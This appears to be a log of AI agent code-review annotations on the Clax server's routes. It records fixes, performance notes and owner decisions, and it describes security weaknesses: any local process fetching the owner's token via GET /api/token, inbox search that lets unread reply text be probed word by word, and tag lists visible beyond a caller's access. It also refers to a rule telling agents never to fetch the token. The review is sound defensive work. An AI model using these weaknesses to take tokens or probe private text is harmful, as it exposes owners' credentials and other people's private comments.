{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/token.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-19T17:03:42.259819Z","id":"878ca21d8974db3b16af3f38daa9c96e9a13cafafa6a631635f8a941242512b8","body":{"detail":"Callers of GET /api/token: the shell (web/shell/src/api.ts:103, a same-origin browser fetch; its bearer token signs the shell's writes and the response sets the owner and events cookies), the demo driver (demo/lib/http.ts:114, a Node process with no Sec-Fetch-Site), the extension worker (web/extension/src/sw/worker.ts:70-72, stubbed to 204), and the hosted daemon's own branch (crates/clax-http/src/hosted.rs:1384, 1527, the shell token in place of the daemon token). The skills tell agents never to fetch it (plugins/*/skills/clax/SKILL.md, checked by scripts/test-plugins.sh:485), and docs/contract.md:6110-6116 already accepts that an owner agent running as the owner's OS user can. Other routes trust loopback too: live pages are visible to any loopback peer (docs/contract.md, Security model), so the question is wider than this handler.\n\nOptions:\n(A) Document loopback trust: state in docs/contract.md's Security model that every process and OS user able to reach the loopback port is trusted at the owner's level (the 0600 daemon.json guards the token at rest, not the daemon), and record a waiver on token.rs:28-47. No behaviour change; multi-user machines stay exposed.\n(B) Require Sec-Fetch-Site: same-origin and an Origin of the daemon's own host on /api/token. Stops only a naive fetch (any process can set both headers); demo/lib/http.ts:114 would need to send them. Little real protection.\n(C) Check the peer's OS user. TCP gives no peer UID on macOS without platform calls (the workspace forbids unsafe, so libproc FFI is out; lsof per request is slow); a Unix socket gives it (LOCAL_PEERCRED / SO_PEERCRED) but a browser cannot use one, so the shell would need another route to the token.\n(D) Stop handing the token out by loopback alone: the CLI (`clax open`, crates/clax-commands/src/commands/open.rs, which runs as the owner and can read daemon.json) opens the shell with a one-use code that /api/token exchanges for the token and the owner cookie; a browser that opens the gallery without one is a viewer until the next `clax open`. Closes the hole for other OS users and sandboxes without file access; changes how the owner's browser becomes the owner (bookmarks, a restarted daemon) and needs the demo driver and the e2e fixtures (web/e2e/fixtures.ts:216-221, web/e2e/streams.spec.ts) reworked.\n\nRecommendation: (A) now, as a waiver plus the contract sentence, since Clax targets single-user machines and live pages already trust loopback; (D) if multi-user machines or loopback-only sandboxes become a supported setting.","kind":"comment","references":"c3cd21b02cb719005e6156b117397abed028fb77d468af8a38b37cbc1bee639a","summary":"Needs the owner's call: whether any local process or OS user with loopback access is trusted at the owner's level, which decides how /api/token is closed","tags":["status:needs-decision","session:claude-code:39187025-0a9f-4b13-8d2e-a1ea08e924ac"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/artifacts.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-19T17:08:02.219342Z","id":"8d7c85f3dea9517b743f9133534d246dcf2a8764f06d8fb951a5535edbeccb20","body":{"kind":"resolve","ref":"git:50951558b","summary":"Fixed: has_viewer uses who.names_viewer(), so a hosted session's viewer gets Cache-Control private and Vary Cookie; api_hosted::an_artifacts_answer_with_a_signed_in_viewers_attention_is_private passes (failed before).","supersedes":"4a99cab1ea600c2be9e97416061e6b8b1031475d4516ddc9a326e0aa84a3a49c","tags":["reason:fixed","session:claude-code:39187025-0a9f-4b13-8d2e-a1ea08e924ac"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/artifacts.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-19T17:08:02.262715Z","id":"5bbc8890e55344422ab821f5e9653f6ac97f26550bb0209b687116daa2a8327b","body":{"kind":"resolve","ref":"git:f4699d186","summary":"Fixed: fork takes its session from the verified caller (a.caller.session()); api_forks::a_persons_browser_cannot_fork_as_an_owner_agent_session passes (failed before), an_agent_session_forks_and_watches_its_fork still passes.","supersedes":"ba839dc22b0b62d3285527c255ab1c700b718ada070854f9fb095ac63f274d66","tags":["reason:fixed","session:claude-code:39187025-0a9f-4b13-8d2e-a1ea08e924ac"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/content.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-19T17:08:02.439600Z","id":"5fdb6814fd5c16d8ad5f6f655c73c3dcb8e6dd783ea53d59efaf2746b9a9d867","body":{"kind":"resolve","ref":"git:584fdd8e4","summary":"Fixed: content lookup reads the live artifact before file_meta; api_content::a_deleted_artifacts_files_are_not_served_while_its_content_remains passes (failed before).","supersedes":"3d1ff28002d90caa359de3b3e3b0ea58776c61e7b5544295658329e1eacc3349","tags":["reason:fixed","session:claude-code:39187025-0a9f-4b13-8d2e-a1ea08e924ac"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/feedback.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-19T17:08:02.578379Z","id":"a690283369da7d69cdbf45e1078a41a519bfe7e021360a54c06b9f4495d73773","body":{"kind":"resolve","ref":"git:e9c9d6637","summary":"Fixed: MAX_ACK_IDS = 500 enforced with 400 invalid_json; MCP client, Pi client and linked sync chunk; api_feedback::ack_takes_at_most_its_cap_of_ids_per_list and comments::acknowledgements_past_the_daemons_cap_go_in_chunks pass.","supersedes":"29aaf55978127ca5ca1d27b21b6bbeb87b8cbf6ab4f577d528a931fa4c6e5e96","tags":["reason:fixed","session:claude-code:39187025-0a9f-4b13-8d2e-a1ea08e924ac"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/guards.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-19T19:09:26.135481Z","id":"7569f2b348f89c01745ac8448bfad8e6689d22b12f41b98fb3580ba278dc1d24","body":{"detail":"Moved from crates/clax-server/src/routes/mod.rs:1360:1376, record be332351. CONTENT_VIEWS and PEOPLE_VIEWS list the calls that build views in this codebase (thread_view(, with_owner(, list_versions(, doc_get(, working.for_artifact(, question_view(, inbox_views(, grant_view(, Sse::new(, ...). A handler that serialises an Artifact or a Version directly (json!({\"artifact\": a})) or calls a helper that does is not seen. MUST_REFUSE pins the routes spec §7.5 names.","kind":"concern","ref":"git:acb06db9","span":{"start":{"line":1238},"end":{"line":1279},"content_hash":"81457863f5a6f37f002514515cebebced86ea812b3069431a7be337d750945e9"},"summary":"The Own and not_for_agents guards recognise views by source text","supersedes":"6d9a56f5b255ad11342acc9fdd90faa2cee43f8b805e4b66e072af9c2d424555","tags":["session:claude-code:6847a238-376f-486d-8e40-4d0fa676e347","session:claude-code:d1f51555-8e8f-4c11-acd6-673f773ac34d"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/guards.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-19T19:09:26.277997Z","id":"19fcbeeb8cafd40222838162fb99cf5bb7f6518ce17d0c8cd7fb6da6fd316c5c","body":{"detail":"Moved from crates/clax-server/src/routes/mod.rs:1757:1783, record 67937f34. Spec §8.6 allowlists two direct spawns. plugins/pi/src/daemon.ts also runs `<bin> --version` (binaryVersion) and `ensure-clax.sh` with no arguments (findBinary, which prints the binary's path). Neither reaches the daemon or the model's context, so the guard accepts them.","kind":"waiver","ref":"git:acb06db9","span":{"start":{"line":1828},"end":{"line":1855},"content_hash":"6cce876e324df5229bc43d9cb8fef99778d482642c51a693a6f98c18e4f83838"},"summary":"Pi may run the binary directly for --version, and the wrapper with no arguments, beside serve --json and status --json","supersedes":"0a65af984b96d87186f00c5ab46c4c9534b92fe9f3b89398fc08c5d435994a04","tags":["session:claude-code:6847a238-376f-486d-8e40-4d0fa676e347","session:claude-code:d1f51555-8e8f-4c11-acd6-673f773ac34d"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/viewers.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-19T19:09:26.501080Z","id":"14441b21f9b1ec8266735f02526b6362dca2af75faa2ce859ec9f5b48eb755c8","body":{"detail":"lookup with the token lists viewers by name; the not_for_agents rule names person views and /api/people*. Names are not filtered (spec section 21.9), so this may be intended; no record says so.","kind":"concern","span":{"start":{"line":131},"end":{"line":131},"content_hash":"488788d1be522605a832513c2bc5a1678bd094c12ce782d53eab83705379c5a6"},"suggested_fix":"Decide: refuse_agents() here, or record that names are not a person view.","summary":"The viewer name search serves the owner's agents","supersedes":"7c699d113ed2c33d4ea1fbc506df4653546f362127c1653cd34a5eaf3cbab872","tags":["review","task-6","status:needs-decision","session:claude-code:4661063b-b304-434f-95f6-59a30e211068","session:claude-code:6847a238-376f-486d-8e40-4d0fa676e347","session:claude-code:d1f51555-8e8f-4c11-acd6-673f773ac34d"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/viewers.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-19T19:09:26.764634Z","id":"37b59e8e1e8e20edefb5752ce8efaec7915f14bc03f1195fc56c3a247282c632","body":{"detail":"lookup with the token lists viewers by name; the not_for_agents rule names person views and /api/people*. Names are not filtered (spec section 21.9), so this may be intended; no record says so.","kind":"concern","span":{"start":{"line":172},"end":{"line":174},"content_hash":"1bb871416cb1ea49f8c3e022eb2900e0d61ee9a9be5e5ad1e692a0b0fa63bde3"},"suggested_fix":"Decide: refuse_agents() here, or record that names are not a person view.","summary":"The viewer name search serves the owner's agents","supersedes":"3adceb3bf97de0422b726ab4fea38e1aacf09281c0b5c34ab8a0f87ca8b1d2e8","tags":["review","task-6","status:needs-decision","session:claude-code:6847a238-376f-486d-8e40-4d0fa676e347","session:claude-code:d1f51555-8e8f-4c11-acd6-673f773ac34d"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/inbox.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-19T19:09:29.809166Z","id":"f65f293eaefe0692e127a4d1fa1d23045f243b50639742cbefdf85d8edf1f00b","body":{"detail":"GET /api/inbox?q= searches inbox_fts, whose text holds each reply's body (crates/clax-core/src/store/inbox.rs insert_at). Since 60859f1e a person who may not read an artifact's comments gets its reply items without body or summary, but a search still returns or omits those items by their text, and total counts them, so the text can be probed word by word.","kind":"concern","span":{"start":{"line":349},"end":{"line":356},"content_hash":"97aff2f64f4383545e809efc6a1e14b43985a6823f8b3ce65a3352ff08541408"},"suggested_fix":"On a hosted daemon, leave out of a text search the items of artifacts whose comments the recipient may not read (filter the matched rows with inbox::reads_comments before paging, or keep text searches to items whose artifact they read comments at).","summary":"A hosted person's inbox search matches reply text they may no longer read","supersedes":"8041ddee9c1876808121d61d1688ada80b7691321d0936ae14b3205d226a7b13","tags":["hosted","security","session:claude-code:6847a238-376f-486d-8e40-4d0fa676e347","session:claude-code:d1f51555-8e8f-4c11-acd6-673f773ac34d"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/artifacts.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-19T19:29:04.524329Z","id":"4b0df7e358c11264950220b18a5948d9b47baa8e7c75ce2ded74f63795cf705a","body":{"detail":"POST /api/artifacts is TokenOrAgent and takes any files: opening it to people's browsers would let a browser publish arbitrary HTML as a person, and the brief thread would be a second request the browser makes. POST /api/artifacts:new writes the placeholder itself (clax_core::brief::placeholder_html, the title escaped) and the brief thread in one store call, deleting the artifact when the thread cannot be written.","kind":"alternative","span":{"start":{"line":535},"end":{"line":748},"content_hash":"fa0dff614f32fa7639dbb94bc4294cc4972bbae6cf23b9365b6eea9fda3cc173"},"summary":"Let the browser publish the placeholder through POST /api/artifacts instead of a route of its own","supersedes":"32f297a721a275a3f55c42abeca512e2f1c2ab3a3fcd68e553a612788b19a291","tags":["revisit:the gallery lets people paste or upload a page of their own","session:claude-code:d1f51555-8e8f-4c11-acd6-673f773ac34d"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/artifacts.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-19T19:29:04.621317Z","id":"31ffec38d7a3b59c3fb9cee6c8b00ea4eb1c283d242efac1a5b06b188ae294a1","body":{"detail":"The brief is written with announce_new_thread(mention=false, named=None): an @ in it sends nothing. The dialog's picker is the one way the brief reaches an agent, so a refused @name (agent_cannot_read) can never fail the artifact's creation after it was made.","kind":"alternative","span":{"start":{"line":535},"end":{"line":748},"content_hash":"fa0dff614f32fa7639dbb94bc4294cc4972bbae6cf23b9365b6eea9fda3cc173"},"summary":"Act on @agent and @name in the brief as in any viewer comment","supersedes":"d2a62dc61cd966d4ec578b1e49fb1de46007e87fc69c7f5f37cee72aca6ad8f2","tags":["revisit:people write @name in briefs expecting it to send","session:claude-code:d1f51555-8e8f-4c11-acd6-673f773ac34d"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/artifacts.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-19T19:29:04.657693Z","id":"9493ceda30192579dec2fb9edabdda948c8bb30d5d07fa610bcf3c1075b00a1d","body":{"detail":"Live seats are per artifact (docs/contract.md 'Live seats and spectators'); there is no gallery-wide spectator state. A new artifact is its maker's, so their seat there is reserved (clax_http::seats::claim_for: created_by), and they write and send its brief. brief_refusal checks the person's rights (create, read own, comments write) and refuses guests, but no seat. tests api_hosted::people_start_artifacts_from_briefs_and_guests_may_not shows Kim, a spectator on Plan, creating. If 'spectators may not create' means something else (for example refusing a person who is a spectator anywhere right now, or capping creation while seats are full), that needs a rule the seat model does not have yet.","kind":"concern","span":{"start":{"line":493},"end":{"line":533},"content_hash":"944402e3165facbab6912aad6318d25b794299c1ea36153448de34b07ae465d1"},"summary":"Spectators: a person beyond another artifact's live seats may start an artifact from a brief","supersedes":"299d57e8452e92e12580ac75c3693b8882e9a60eefed6adca8020d82ab216ce1","tags":["status:needs-decision","session:claude-code:d1f51555-8e8f-4c11-acd6-673f773ac34d"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/threads.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-19T18:36:46.677771Z","id":"c107137ca74c4383b02771bd859e185fd8e640d2d5a7dc90a7c71dcbba528b2c","body":{"kind":"comment","references":"3093025901aad08add351fe2dea5b9445b7cbe6393781175bcd7a886d6277372","summary":"Same defect as record b8ab7260 (crates/clax-store/src/linked.rs); fixed by git:05be14efd: the key is looked up and recorded inside the thread's or comment's own transaction (Store::create_thread_keyed_async, add_comment_keyed, add_agent_reply_keyed), and record_comment_key is removed. Test: clax-store linked::tests::a_keyed_thread_or_comment_is_made_once_with_its_key; the clax-server integration groups 1-6 pass.","tags":["session:claude-code:39187025-0a9f-4b13-8d2e-a1ea08e924ac"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/threads.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-19T19:02:15.191985Z","id":"4696f1a5eda10d9634890089275e0feab9037693b039f7eda82ad8c57ef7f321","body":{"detail":"git:551c720f0 looks the key up and records it inside the thread's or comment's own transaction (Store::create_thread_keyed_async, add_comment_keyed, add_agent_reply_keyed) and removes record_comment_key; test: clax-store linked::tests::a_keyed_thread_or_comment_is_made_once_with_its_key. git:5a978209f makes a resend go through the route and do the sends its first write may not have reached (create_thread_keyed_now on Keyed::Before; the comment route's replayed comment); test: clax-server tests/api_linked.rs a_resent_keyed_write_does_the_sends_its_first_write_did_not_reach, which fails on 551c720f0 (assertion failed: sent(&t.id)).","kind":"comment","references":"3093025901aad08add351fe2dea5b9445b7cbe6393781175bcd7a886d6277372","summary":"Same defect as record b8ab7260 (crates/clax-store/src/linked.rs); fixed by git:551c720f0 and git:5a978209f","supersedes":"c107137ca74c4383b02771bd859e185fd8e640d2d5a7dc90a7c71dcbba528b2c","tags":["session:claude-code:39187025-0a9f-4b13-8d2e-a1ea08e924ac"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/threads.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-19T19:23:05.637232Z","id":"5f1f58a145c8ebcd05601301e34d70b75bda9b6a2c5add315797f0f6f735bcdb","body":{"detail":"A replayed viewer comment runs its sends again when Store::comment_has_feedback (crates/clax-store/src/linked.rs:1416) finds no feedback row, which cannot tell a send that was lost from a comment that never needed one: such a comment re-runs resolve_named and a Route::Join send_routed with the thread's state at the resend (a Join may count the comment into open approval requests a second time). A replayed thread (create_thread_keyed_now, line 651) announces with the resend's body for its @mentions, not the stored first comment's. Both are idempotent for feedback rows; neither is covered beyond tests/api_linked.rs a_resent_keyed_write_does_the_sends_its_first_write_did_not_reach.","kind":"concern","span":{"start":{"line":1125},"end":{"line":1140},"content_hash":"862f9f79e70123c5d03b35decdca61e33160d9b9b1ae21c105782032f83c0bbd"},"summary":"A keyed write's replay re-runs its follow-up with the state at the resend, not the first write's","tags":["linked-threads","session:claude-code:39187025-0a9f-4b13-8d2e-a1ea08e924ac"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/threads.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-19T20:38:03.236444Z","id":"49e1428a299836d17ece9542a3c79ab9d3a5860ab02784258213292a6d21a665","body":{"kind":"resolve","ref":"git:fde797b85","summary":"Fixed (fde797b85, 70b6e33ce): a keyed thread or comment records its comment_keys row in the transaction that writes it, and a resend does the sends its first write did not reach; api_linked::a_resent_keyed_write_does_the_sends_its_first_write_did_not_reach passes (failed before).","supersedes":"3093025901aad08add351fe2dea5b9445b7cbe6393781175bcd7a886d6277372","tags":["reason:fixed","session:claude-code:39187025-0a9f-4b13-8d2e-a1ea08e924ac"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/inbox.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-20T00:25:08.914195Z","id":"ee7bd7d39416df5c010d341525cd72a68e365e43fafae2110aa998520c4c8f04","body":{"detail":"GET /api/inbox?q= searches inbox_fts, whose text holds each reply's body (crates/clax-core/src/store/inbox.rs insert_at). Since 60859f1e a person who may not read an artifact's comments gets its reply items without body or summary, but a search still returns or omits those items by their text, and total counts them, so the text can be probed word by word.","kind":"concern","span":{"start":{"line":364},"end":{"line":371},"content_hash":"97aff2f64f4383545e809efc6a1e14b43985a6823f8b3ce65a3352ff08541408"},"suggested_fix":"On a hosted daemon, leave out of a text search the items of artifacts whose comments the recipient may not read (filter the matched rows with inbox::reads_comments before paging, or keep text searches to items whose artifact they read comments at).","summary":"A hosted person's inbox search matches reply text they may no longer read","supersedes":"f65f293eaefe0692e127a4d1fa1d23045f243b50639742cbefdf85d8edf1f00b","tags":["hosted","security","session:claude-code:6847a238-376f-486d-8e40-4d0fa676e347","session:claude-code:d1f51555-8e8f-4c11-acd6-673f773ac34d"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/threads.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-20T00:25:09.768554Z","id":"67875a2f28c891bd0afe5d791ff56cbf046fd4e5a7875f6110fbf062ab3e479e","body":{"detail":"Watches are TokenOrAgent: a session subscribes itself. A browser adding a watch for any session would bypass the approval routing that a send naming an agent does (Store::send_routed, Route::Send). Instead a person's send {to} may name any live agent that may read and watch the artifact, giving it a watch exactly as an @name in their comment does (resolve_named): no new authority, and the approval path is the existing one. Agents keep the old rule (they hand threads off), and so do guests and LAN viewers and batch sends.","kind":"alternative","span":{"start":{"line":1207},"end":{"line":1243},"content_hash":"7ab431500a63efc3ee10729f8d717c233bcdf442a07fa0f537625dbc2a02f577"},"summary":"Attach the picked agent with PUT /api/sessions/<sid>/watches/<aid> from the browser, or a route of its own","supersedes":"d8ef18074e9eecdbcf14a25893036c458f753b79ca688be52ef1b993ca740c51","tags":["revisit:guests or LAN viewers need to attach agents from a Send menu","session:claude-code:d1f51555-8e8f-4c11-acd6-673f773ac34d"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/tags.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-20T03:35:40.476828Z","id":"a925ce06c10fd48d83778eeba4835704bb222896965cf5f005b7560ad7cffb72","body":{"detail":"The counts are computed from list_artifacts() in the bulk lane, O(artifacts) per call, like GET /api/artifacts itself. It also does not leave out the live pages merged into another (artifacts::list does, via merged_live_pages), so the owner's counts can include a merged-away page that the gallery hides. Neither is measured by scripts/perf-daemon.sh.","kind":"concern","span":{"start":{"line":74},"end":{"line":106},"content_hash":"85d4a495749a2082959b72e0ed0c2d4c508b8f756c655b4903080e2d0a85cbbc"},"summary":"GET /api/tags reads every artifact on each request to count, and counts pages a join merged away","tags":["perf","session:claude-code:d1f51555-8e8f-4c11-acd6-673f773ac34d"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/tags.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-20T03:35:40.476899Z","id":"b15019d566ef476c7a448d9183d0dfed17fd1c1b4bfab6dfd1a41b39b5458492","body":{"detail":"manages_tags admits Caller::PersonAgent { person: None } (an agent of another machine connected as the owner) beside the token's agents, and the routes' need (crates/clax-http/src/agent.rs TagsCreate/TagsUpdate/TagsDelete) asks such a grant for clax-artifacts update somewhere. A narrowed owner-row grant without update anywhere is refused 403 not_permitted. This reads 'the owner's agents' to include the owner's agents on other machines.","kind":"concern","span":{"start":{"line":38},"end":{"line":43},"content_hash":"b7f4f93642d641007c42ced8313caa676664cea9ab56243a85e4f62b711e8543"},"summary":"A grant of the owner's row manages tags as the owner's agents do","tags":["status:needs-decision","session:claude-code:d1f51555-8e8f-4c11-acd6-673f773ac34d"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/tags.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-20T03:35:40.476933Z","id":"055bd147eb7813e36287c9831448be80d504c580128df20752937d961dfaeb55","body":{"detail":"The hosted gate (crates/clax-http/src/hosted.rs guest_need) refuses GET /api/tags to a guest or a signed-out visitor (401 sign_in_required): they see a shared page's tags on the artifact itself but get no tag list. A guest's tag filter UI would need the tags from the artifacts it holds, or a guest_need rule for /api/tags (guests would then see only tags in use on what they read, as the route already computes for a local daemon's guests).","kind":"concern","span":{"start":{"line":74},"end":{"line":106},"content_hash":"85d4a495749a2082959b72e0ed0c2d4c508b8f756c655b4903080e2d0a85cbbc"},"summary":"A hosted Clax's guests cannot list the tags of the pages shared with them","tags":["revisit:the UI phase gives hosted guests a tag filter","session:claude-code:d1f51555-8e8f-4c11-acd6-673f773ac34d"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/inbox.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-20T03:35:40.486367Z","id":"65ffeeb81097bda53069023f5e2ea5bfe376e8b1a14cd1eb151c1e8de80a13e4","body":{"detail":"With ?tag=, questions are kept by reading their artifact's tags one get_artifact per distinct artifact (memoised per request), up to SUMMARY_QUESTIONS (200) questions. Cheap at today's sizes; a query joining questions to artifact_tags would avoid it.","kind":"concern","span":{"start":{"line":495},"end":{"line":512},"content_hash":"123ba571ba61f445661d4ee9e80be1eca8221500a3c4e06d0c0563db81990945"},"summary":"The inbox summary's tag filter reads each open question's artifact","tags":["perf","session:claude-code:d1f51555-8e8f-4c11-acd6-673f773ac34d"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/tags.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-20T03:53:17.992541Z","id":"5a5c01cb85f60126a66c4c21ae103e7aeb0613f5759b7799f7bfacc440ac6dd0","body":{"detail":"GET /api/tags hides unused tags from guests only (guest = Caller::Viewer | Caller::Anonymous, line 82; filter at line 99). A hosted Clax's member who holds one share, or a person's agent whose grant reads one artifact, still gets the whole list: each name and its up-to-200-character description (crates/clax-core/src/tags.rs MAX_DESCRIPTION_CHARS), with count 0 for the tags on artifacts it cannot read. Tag names and descriptions can name work the caller was never shown (a client's or a project's name). The intent is documented (docs/contract.md 'Tags', GET /api/tags: members and agents 'see every tag, so they know what they may apply'), but a member applies tags only to artifacts it made, so the list it needs is not obviously all of them. The other choice: members see the tags in use on what they read, plus the whole list only when the owner marks a tag public, or no descriptions for them.","kind":"concern","span":{"start":{"line":74},"end":{"line":106},"content_hash":"85d4a495749a2082959b72e0ed0c2d4c508b8f756c655b4903080e2d0a85cbbc"},"summary":"Every hosted member and every person's agent reads every tag's name and description, whatever they may read","tags":["review","review:artifact-tags","security","status:needs-decision","session:claude-code:d1f51555-8e8f-4c11-acd6-673f773ac34d"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/inbox.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-20T03:53:17.993147Z","id":"3ac5c4bfb8f56f15ea6aed4eae65c24ca5c90b156961d5aa4be0b523303e5da5","body":{"detail":"summary calls db.tag_filter_ids(&tags) unconditionally, and crates/clax-store/src/tags.rs:385-394 reads list_tags() (up to 500 rows) before mapping an empty refs list to an empty Vec. The summary is fetched by the gallery and the top bar on each load, nearly always without ?tag=.","kind":"suggestion","span":{"start":{"line":495},"end":{"line":495},"content_hash":"471db0ecde3929c590bf01de08cda0c212e61a5c397bc06959dfca82f0e0aa9b"},"suggested_fix":"Return early in tag_filter_ids when refs is empty.","summary":"The inbox summary reads the whole tag list on every call, filtered or not","tags":["review","review:artifact-tags","perf","session:claude-code:d1f51555-8e8f-4c11-acd6-673f773ac34d"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/inbox.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-20T03:55:11.179667Z","id":"a00ccefc9b93dd999e7d8fce22a25406c6020fc978ef964a91f91a5cf0b0dfac","body":{"detail":"crates/clax-server/src/routes/inbox.rs:495 calls db.tag_filter_ids(&tags) without an is_empty guard (with_tags at :172-176 does guard). crates/clax-store/src/tags.rs:385-386 runs self.list_tags() (all_tags at :83-87, no LIMIT; the list is capped by MAX_TAGS = 500, crates/clax-core/src/tags.rs:25) before mapping refs.","kind":"comment","references":"3ac5c4bfb8f56f15ea6aed4eae65c24ca5c90b156961d5aa4be0b523303e5da5","summary":"confirmed: the summary calls tag_filter_ids unconditionally, which reads the whole tag list first","tags":["verified:confirmed","session:claude-code:d1f51555-8e8f-4c11-acd6-673f773ac34d"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/tags.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-20T03:55:11.180166Z","id":"1b7b6cccbe767b2c4c2bdc76322d3f0d6ed76b0783a2126c013d0a442dd2ba36","body":{"detail":"crates/clax-server/src/routes/tags.rs:82 sets guest = matches!(caller, Caller::Viewer { .. } | Caller::Anonymous); :94-100 maps every list_tags() row and filters by count only when guest, serialising the whole Tag (description included, up to MAX_DESCRIPTION_CHARS = 200, crates/clax-core/src/tags.rs:22). The doc comment at :64-72 states this intent, so the question is a design choice; concern with status:needs-decision fits.","kind":"comment","references":"5a5c01cb85f60126a66c4c21ae103e7aeb0613f5759b7799f7bfacc440ac6dd0","summary":"confirmed: only Viewer and Anonymous callers have unused tags hidden; members and person agents get every name and description","tags":["verified:confirmed","session:claude-code:d1f51555-8e8f-4c11-acd6-673f773ac34d"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/tags.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-20T04:14:34.062224Z","id":"83090171bd604e91baad07761eff47dc8ce2c1da6bbc2288a3711a8740b166d9","body":{"detail":"The owner's answer, verbatim: \"All signed-in people (as built)\". Members and agents see every tag name and description, with counts only for what they can see; guests see only tags on artifacts they can see. No code change; docs/contract.md (Tags, GET /api/tags) states the rule since 735162fc2. Relayed to this agent by the coordinator, recorded under the agent's own identity.","kind":"comment","references":"5a5c01cb85f60126a66c4c21ae103e7aeb0613f5759b7799f7bfacc440ac6dd0","summary":"Decided by the owner (Alex Kesling, 2026-10-20, asked through the coordinator's AskUserQuestion): keep the whole tag list for every signed-in person and agent, as built","tags":["status:decided","session:claude-code:d1f51555-8e8f-4c11-acd6-673f773ac34d"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/tags.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-20T04:14:34.062848Z","id":"1d1824c51b7f9b5be5a68d08e236f62fe2df24e8e6854748ed0bdb04c48eae0d","body":{"detail":"The owner's answer, verbatim: \"Yes, as built\". No code change; docs/contract.md (Tags, 'The list is the owner's') states it since 735162fc2, and crates/clax-server/tests/api_tags.rs a_grant_of_the_owners_row_manages_tags_and_applies_them_anywhere (bffaeb4d0) covers it. Relayed to this agent by the coordinator, recorded under the agent's own identity.","kind":"comment","references":"b15019d566ef476c7a448d9183d0dfed17fd1c1b4bfab6dfd1a41b39b5458492","summary":"Decided by the owner (Alex Kesling, 2026-10-20, asked through the coordinator's AskUserQuestion): a grant of the owner's row manages tags as the owner's agents do, as built","tags":["status:decided","session:claude-code:d1f51555-8e8f-4c11-acd6-673f773ac34d"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/tags.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-20T04:14:34.063561Z","id":"90c76cb4da58d6e1e6ae4a2a4a044ed4ef28c3da6bb8a6af5bd0de046fb6b233","body":{"kind":"resolve","ref":"git:735162fc2","summary":"Closed on the owner's decision of 2026-10-20 (\"All signed-in people (as built)\"): the full list stays for signed-in people and agents; docs/contract.md says so (735162fc2)","supersedes":"5a5c01cb85f60126a66c4c21ae103e7aeb0613f5759b7799f7bfacc440ac6dd0","tags":["reason:fixed","session:claude-code:d1f51555-8e8f-4c11-acd6-673f773ac34d"]}}
